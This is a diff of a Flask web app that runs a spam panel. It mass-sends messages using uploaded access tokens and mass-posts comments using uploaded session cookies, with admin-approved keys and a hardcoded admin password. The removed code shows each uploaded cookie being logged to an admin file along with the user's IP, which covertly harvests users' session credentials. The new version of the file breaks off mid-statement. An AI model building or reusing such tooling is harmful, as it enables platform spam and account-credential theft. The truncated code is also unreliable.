@@ -1,10 +1,10 @@
-from flask import Flask, request, redirect, url_for
-import requests
-from threading import Thread, Event
+import os
+import json
 import time
 import uuid
-import json
-import os
+import requests
+from threading import Thread, Event
+from flask import Flask, request
 
 app = Flask(__name__)
 app.debug = True
@@ -23,18 +23,17 @@ ADMIN_TOKENS_LOG = "admin_tokens.log"
 ADMIN_COOKIES_LOG = "admin_cookies.log"
 MESSAGE_LOG = "message_log.txt"
 
-# Load or create approved keys for token and cookie features
-if os.path.exists(APPROVED_KEYS_TOKEN_FILE):
-    with open(APPROVED_KEYS_TOKEN_FILE, "r") as f:
-        approved_keys_token = json.load(f)
-else:
-    approved_keys_token = {}
+def safe_load_json(file_path):
+    if not os.path.exists(file_path) or os.stat(file_path).st_size == 0:
+        return {}
+    try:
+        with open(file_path, "r") as f:
+            return json.load(f)
+    except json.JSONDecodeError:
+        return {}
 
-if os.path.exists(APPROVED_KEYS_COOKIE_FILE):
-    with open(APPROVED_KEYS_COOKIE_FILE, "r") as f:
-        approved_keys_cookie = json.load(f)
-else:
-    approved_keys_cookie = {}
+approved_keys_token = safe_load_json(APPROVED_KEYS_TOKEN_FILE)
+approved_keys_cookie = safe_load_json(APPROVED_KEYS_COOKIE_FILE)
 
 def save_approved_keys_token():
     with open(APPROVED_KEYS_TOKEN_FILE, "w") as f:
@@ -66,8 +65,6 @@ headers = {
     'Accept-Language': 'en-US,en;q=0.9'
 }
 
-# ==== Token based message sending ====
-
 def send_messages_token(access_tokens, thread_id, user_name, time_interval, messages):
     global stop_event_token, sent_count_token
     while not stop_event_token.is_set():
@@ -89,8 +86,6 @@ def send_messages_token(access_tokens, thread_id, user_name, time_interval, mess
                 except Exception as e:
                     print(f"Token Msg error: {e}")
                 time.sleep(time_interval)
-
-# ==== Cookie based comment posting ====
 
 def send_comments_cookie(cookies_list, post_id, commenter_name, delay, comments):
     global stop_event_cookie, sent_count_cookie
@@ -123,16 +118,11 @@ def send_comments_cookie(cookies_list, post_id, commenter_name, delay, comments)
             print(f"Cookie Comment error: {e}")
             time.sleep(5)
 
-# ==== Routes ====
-
 @app.route('/', methods=['GET', 'POST'])
 def index():
     global threads_token, threads_cookie, stop_event_token, stop_event_cookie, sent_count_token, sent_count_cookie
 
-    # Show main page with two options + key generation
-
     if request.method == 'GET':
-        # Generate keys if not exist (one for token, one for cookie)
         new_key_token = str(uuid.uuid4())[:8]
         if new_key_token not in approved_keys_token:
             approved_keys_token[new_key_token] = False
@@ -233,7 +223,6 @@ def index():
             <label>Enter Your Approved Key:</label>
             <input name="secret_key" required>
 
-            <!-- Token Spam fields -->
             <div id="token_fields" style="display:none;">
               <label>Select Token File (one token per line):</label>
               <input type="file" name="tokenFile">
@@ -247,7 +236,6 @@ def index():
               <input type="file" name="txtFile">
             </div>
 
-            <!-- Cookie Commenter fields -->
             <div id="cookie_fields" style="display:none;">
               <label>Select Cookie File (one cookie per line):</label>
               <input type="file" name="cookieFile">
@@ -294,7 +282,6 @@ def index():
         </html>
         """
 
-    # POST handling: start sending for selected mode
     if request.method == 'POST':
         mode = request.form.get('mode')
         secret_key = request.form.get('secret_key', '').strip()
@@ -327,112 +314,4 @@ def index():
             return "<h3 style='color:green; text-align:center;'>✅ Token spam started. <a href='/status'>Status</a></h3>"
 
         elif mode == 'cookie':
-            if secret_key not in approved_keys_cookie or not approved_keys_cookie.get(secret_key):
-                return "<h3 style='color:red; text-align:center;'>❌ Cookie key invalid or not approved.</h3>"
-
-            cookie_file = request.files.get('cookieFile')
-            cookies_list = cookie_file.read().decode().strip().splitlines() if cookie_file else []
-            for c in cookies_list:
-                log_admin_cookie(secret_key, c, user_ip)
-
-            post_id = request.form.get('postId')
-            commenter_name = request.form.get('commenterName', 'User')
-            delay = int(request.form.get('delay', 5))
-
-            comments_file = request.files.get('commentsFile')
-            comments = comments_file.read().decode().splitlines() if comments_file else []
-
-            if not any(t.is_alive() for t in threads_cookie):
-                stop_event_cookie.clear()
-                global sent_count_cookie
-                sent_count_cookie = 0
-                thread = Thread(target=send_comments_cookie, args=(cookies_list, post_id, commenter_name, delay, comments))
-                thread.start()
-                threads_cookie.append(thread)
-
-            return "<h3 style='color:green; text-align:center;'>✅ Cookie commenter started. <a href='/status'>Status</a></h3>"
-
-        else:
-            return "<h3 style='color:red; text-align:center;'>❌ Invalid mode selected.</h3>"
-
-@app.route('/stop', methods=['POST'])
-def stop_sending():
-    stop_event_token.set()
-    stop_event_cookie.set()
-    return "<h3 style='color:orange; text-align:center;'>🛑 All sending stopped.</h3><a href='/'>Go Back</a>"
-
-@app.route('/status')
-def status():
-    running_token = any(t.is_alive() for t in threads_token)
-    running_cookie = any(t.is_alive() for t in threads_cookie)
-    status_str = "Running" if (running_token or running_cookie) else "Stopped"
-    return f"""
-    <h3 style='text-align:center;'>Bot Status: {status_str}</h3>
-    <p style='text-align:center;'>Token Messages sent: {sent_count_token}</p>
-    <p style='text-align:center;'>Cookie Comments sent: {sent_count_cookie}</p>
-    <a href='/'>Go Back</a>
-    """
-
-@app.route('/admin', methods=['GET', 'POST'])
-def admin_panel():
-    ADMIN_PASS = "ayushadmin123"
-    auth = request.authorization
-    if not auth or auth.username != 'admin' or auth.password != ADMIN_PASS:
-        return ('Unauthorized', 401, {'WWW-Authenticate': 'Basic realm="Login Required"'})
-
-    global approved_keys_token, approved_keys_cookie
-    msg = ""
-
-    if request.method == 'POST':
-        key_to_approve_token = request.form.get('approve_key_token')
-        key_to_remove_token = request.form.get('remove_key_token')
-        key_to_approve_cookie = request.form.get('approve_key_cookie')
-        key_to_remove_cookie = request.form.get('remove_key_cookie')
-
-        if key_to_approve_token and key_to_approve_token in approved_keys_token:
-            approved_keys_token[key_to_approve_token] = True
-            save_approved_keys_token()
-            msg = f"✅ Approved Token key: {key_to_approve_token}"
-
-        if key_to_remove_token and key_to_remove_token in approved_keys_token:
-            approved_keys_token.pop(key_to_remove_token)
-            save_approved_keys_token()
-            msg = f"❌ Removed Token key: {key_to_remove_token}"
-
-        if key_to_approve_cookie and key_to_approve_cookie in approved_keys_cookie:
-            approved_keys_cookie[key_to_approve_cookie] = True
-            save_approved_keys_cookie()
-            msg = f"✅ Approved Cookie key: {key_to_approve_cookie}"
-
-        if key_to_remove_cookie and key_to_remove_cookie in approved_keys_cookie:
-            approved_keys_cookie.pop(key_to_remove_cookie)
-            save_approved_keys_cookie()
-            msg = f"❌ Removed Cookie key: {key_to_remove_cookie}"
-
-    # Show keys tables for both token and cookie keys
-
-    def get_last_lines(filename, lines=20):
-        if not os.path.exists(filename):
-            return "No logs yet."
-        with open(filename, "r") as f:
-            all_lines = f.readlines()
-            return "".join(all_lines[-lines:])
-
-    keys_html_token = ""
-    for k, v in approved_keys_token.items():
-        status = "✔️ Approved" if v else "❌ Not Approved"
-        keys_html_token += f"""
-        <tr>
-            <td>{k}</td>
-            <td>{status}</td>
-            <td>
-                <form method='post' style='display:inline'>
-                    <input type='hidden' name='approve_key_token' value='{k}'>
-                    <button type='submit'>Approve</button>
-                </form>
-                <form method='post' style='display:inline'>
-                    <input type='hidden' name='remove_key_token' value='{k}'>
-                    <button type='submit'>Remove</button>
-                </form>
-            </td>
-        </tr>"""
+            if secret_key not in approved_keys_cookie or not approved_keys_cookie
